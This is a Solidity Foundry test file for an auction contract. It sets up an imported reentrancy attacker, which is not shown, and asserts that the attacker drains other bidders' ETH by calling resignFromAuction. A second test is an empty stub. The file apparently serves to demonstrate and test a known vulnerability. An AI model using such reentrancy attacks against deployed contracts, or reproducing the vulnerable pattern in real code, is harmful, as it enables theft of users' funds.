// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./VeriAuctionTokenForEth_setup.t.sol";

// Attacker
import "./Attackers/VeriAuctionTokenForEth_reentrancy_attacker.sol";

contract VeriAuctionTokenForEth_problems_test is VeriAuctionTokenForEth_problems_setup {
    //========================================
    // Variables
    //========================================
    VeriAuctionTokenForEth_reentrancy_attacker attacker;
    uint256 attackCount;

    //========================================
    // setup
    //========================================

    function setUp() public {
        veriAuctionTokenForEth_problems_setup();
        
        attackCount = 3;
        attacker = new VeriAuctionTokenForEth_reentrancy_attacker(attackCount);
    }

    //========================================
    // tests
    //========================================
    
    //====================
    // commitTokens()
    //====================

    function testReentrancyResignFromAuctionMultipleTimes() public {        
        //----------
        // Setup
        //----------

        vm.assume(address(attacker) != bob);
        vm.assume(address(attacker) != charlie);

        uint256 commitmentOfAttacker = 1 ether;
        vm.deal(address(attacker), commitmentOfAttacker);
        vm.prank(address(attacker));
        veriAuction.commitEth{value: commitmentOfAttacker}();

        // Make sure that there is enough ETH in the auction contract.
        uint256 commitmentOfBob = commitmentOfAttacker * attackCount;
        vm.deal(bob, commitmentOfBob);
        vm.prank(bob);
        veriAuction.commitEth{value: commitmentOfBob}();

        // Add a little bit extra ETH to the auction contract.
        uint256 commitmentOfCharlie = 1 ether;
        vm.deal(charlie, commitmentOfCharlie);
        vm.prank(charlie);
        veriAuction.commitEth{value: commitmentOfCharlie}();
        
        //----------
        // Execute
        //----------

        vm.prank(address(attacker));
        veriAuction.resignFromAuction();

        //----------
        // Test
        //----------

        uint256 newAttackerBalance = address(attacker).balance;
        uint256 expectedNewAttackerBalance = commitmentOfAttacker + commitmentOfAttacker * attackCount;
        assertEq(newAttackerBalance, expectedNewAttackerBalance);
    }

    function testReentrancyResignFromAuctionAndClaimTokensOnFinalizedAuction() public {        
        //----------
        // Setup
        //----------
        
        //----------
        // Execute
        //----------

        //----------
        // Test
        //----------
    }
}